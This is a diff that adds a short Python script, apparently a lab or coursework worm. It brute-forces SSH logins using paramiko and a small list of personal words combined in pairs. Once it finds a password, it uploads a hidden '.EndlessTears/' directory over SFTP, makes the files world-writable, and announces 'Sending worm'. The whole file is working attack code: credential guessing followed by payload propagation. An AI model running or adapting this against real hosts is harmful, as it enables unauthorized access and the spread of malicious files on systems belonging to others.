@@ -1,0 +1,58 @@
+#!/usr/bin/env python
+
+import paramiko,os,sys,subprocess
+
+def SSH_Connect(username,hostname,password):
+    print('[*] Testing ssh to ' + username + '@' + hostname + ' with password: ' + password)
+    ssh = paramiko.client.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(hostname,port = 22,username = username,password = password)
+    except paramiko.AuthenticationException:
+        print('\tWrong password, try another...orz')
+        ssh.close()
+        return False
+    except KeyboardInterrupt:
+        ssh.close()
+        print('\nKeyboardInterrupt received')
+        exit(0)
+    else:
+        print('\tCorrect password!!!\n\tpassword: ' + password)
+        ssh.close()
+        atker_passwd = password
+        return True
+def Dictionary_attack(server_info):
+    passwdlist = ['YueHan','Wang','YH','1999','0228','oscar','Realtek','@','_']
+    for w1 in passwdlist:
+        for w2 in passwdlist:
+            if w1 != w2:
+                if SSH_Connect(server_info['user'],server_info['host'],w1 + w2):
+                    server_info['passwd'] = w1 + w2
+                    return server_info
+    return '' # can't find satisfy passwd by this dictionary
+def sftp_put(dir_path,server_info):
+    server_path = '/home/attacker/Public/' + dir_path
+    local_path = dir_path
+    trans = paramiko.Transport(sock = (server_info['host'],22))
+    trans.connect(username = server_info['user'],password = server_info['passwd'])
+    sftp = paramiko.SFTPClient.from_transport(trans)
+    files = os.listdir(local_path)
+    try:
+        sftp.chdir(server_path)
+    except IOError:
+        sftp.mkdir(server_path)
+    for file in files:
+        print("\tUploading " + file)
+        sftp.put(local_path + file,server_path + file)
+        sftp.chmod(server_path + file,777)
+    trans.close()
+def main():
+    server_info = {'user' : 'attacker','host' : subprocess.check_output(["hostname","--all-ip-addresses"]).strip().decode('utf-8'),'passwd' : ''}
+    server_info = Dictionary_attack(server_info)
+    if server_info['passwd'] == '':
+        print('[x] Failed to find password...orz')
+        exit(0)
+    print('[*] Sending worm to {}@{}'.format(server_info['user'],server_info['host']))
+    sftp_put('.EndlessTears/',server_info)
+if __name__ == '__main__':
+    main()
